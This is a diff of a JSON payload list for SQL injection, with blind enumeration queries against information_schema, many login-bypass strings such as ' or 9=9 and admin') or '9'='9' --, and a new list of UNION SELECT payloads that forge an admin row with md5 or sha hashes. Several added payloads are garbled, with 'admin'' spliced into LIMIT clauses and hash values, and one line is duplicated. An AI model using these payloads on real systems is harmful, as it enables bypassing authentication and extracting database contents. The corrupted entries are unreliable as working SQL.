@@ -1,13 +1,15 @@
 {
   "blind": [
-    "' or (select table_name from information_schema.TABLES where table_schema not in (NOTIN) limit 1) regexp '^{}'#",
-    "' or (select schema_name from information_schema.SCHEMATA where schema_name not in (NOTIN) limit 1) regexp '^{}'#",
-    "' or (select column_name from information_schema.COLUMNS where table_schema not in (NOTIN)  limit 1) regexp '^{}'#",
-    "'/**/or/**/(select/**/table_name/**/from/**/information_schema.TABLES/**/where/**/table_schema/**/not/**/in/**/(NOTIN)/**/limit/**/1)/**/regexp/**/'^{}'#",
-    "'/**/or/**/(select/**/schema_name/**/from/**/information_schema.SCHEMATA/**/where/**/schema_name/**/not/**/in/**/(NOTIN)/**/limit/**/1)/**/regexp/**/'^{}'#",
-    "'/**/or/**/(select/**/column_name/**/from/**/information_schema.COLUMNS/**/where/**/table_schema/**/not/**/in/**/(NOTIN)/**/limit/**/1)/**/regexp/**/'^{}'#"
+    "admin'/**/and/**/admin'=0/**/union/**/select/**/admin',SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/where/**/SCHEMA_NAME/**/not/**/in/**/(NOTIN)/**/and/**/SCHEMA_NAME/**/regexp/**/'^{}'#",
+    "admin'/**/and/**/admin'=0/**/union/**/select/**/admin',TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/and/**/TABLE_NAME/**/regexp/**/'^{}'#",
+    "admin'/**/and/**/admin'=0/**/union/**/select/**/COLUMN_NAME/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/and/**/COLUMN_NAME/**/regexp/**/'^{}'#",
+    "'/**/or/**/(select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/where/**/SCHEMA_NAME/**/not/**/in/**/(NOTIN)/**/limit/**/admin')/**/regexp/**/'^{}'#",
+    "'/**/or/**/(select/**/TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/limit/**/admin')/**/regexp/**/'^{}'#",
+    "'/**/or/**/(select/**/COLUMN_NAME/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**//**/limit/**/admin')/**/regexp/**/'^{}'#"
   ],
   "login": [
+    "9 or 9=9#",
+    "9 or 9=9 --",
     "or 9=9",
     "' or 9=9",
     "or 9=9 --",
@@ -36,8 +38,6 @@
     "admin') or '9'='9' --",
     "admin') or '9'='9'#",
     "admin') or '9'='9'/*",
-    "9234 ' AND 9=0 UNION ALL SELECT 'admin', '89dc9bdb52d04dc20036dbd8393ed055",
-    "9234 ' aNd 9=0 uNiOn aLl sElEcT 'admin', '89dc9bdb52d04dc20036dbd8393ed055",
     "admin\" --",
     "admin\" #",
     "admin\"/*",
@@ -58,7 +58,9 @@
     "admin\") or \"9\"=\"9\" --",
     "admin\") or \"9\"=\"9\"#",
     "admin\") or \"9\"=\"9\"/*",
-    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
+    "admin' or true or admin' like '",
+    "admin') or 'admin'' like 'admin'')--",
+    "admin') or 'admin'' like 'admin'')#",
     "or/**/9=9",
     "'/**/or/**/9=9",
     "or/**/9=9/**/--",
@@ -87,8 +89,6 @@
     "admin')/**/or/**/'9'='9'/**/--",
     "admin')/**/or/**/'9'='9'#",
     "admin')/**/or/**/'9'='9'/*",
-    "9234/**/'/**/AND/**/9=0/**/UNION/**/ALL/**/SELECT/**/'admin',/**/'89dc9bdb52d04dc20036dbd8393ed055",
-    "9234/**/'/**/aNd/**/9=0/**/uNiOn/**/aLl/**/sElEcT/**/'admin',/**/'89dc9bdb52d04dc20036dbd8393ed055",
     "admin\"/**/--",
     "admin\"/**/#",
     "admin\"/*",
@@ -108,7 +108,17 @@
     "admin\")/**/or/**/\"9\"=\"9",
     "admin\")/**/or/**/\"9\"=\"9\"/**/--",
     "admin\")/**/or/**/\"9\"=\"9\"#",
-    "admin\")/**/or/**/\"9\"=\"9\"/*",
-    "1234/**/\"/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/\"admin\",/**/\"81dc9bdb52d04dc20036dbd8313ed055"
+    "admin\")/**/or/**/\"9\"=\"9\"/*"
+  ],
+  "union": [
+    "admin' union select 'admin',md5('admin') from users#",
+    "admin' union select 'admin',sha('admin') from users#",
+    "admin' union select 'admin',sha2('admin') from users#",
+    "admin'/**/union/**/select/**/'admin',md5('admin')/**/from/**/users#",
+    "admin' union select 'admin','admin' from users#",
+    "admin'/**/union/**/select/**/'admin','admin'/**/from/**/users#",
+    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3",
+    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3",
+    "whatever ' aNd 9=0 uNiOn aLl sElEcT 'admin', '2admin'232f297a57a5a743894a0e4a80admin'fc3"
   ]
 }
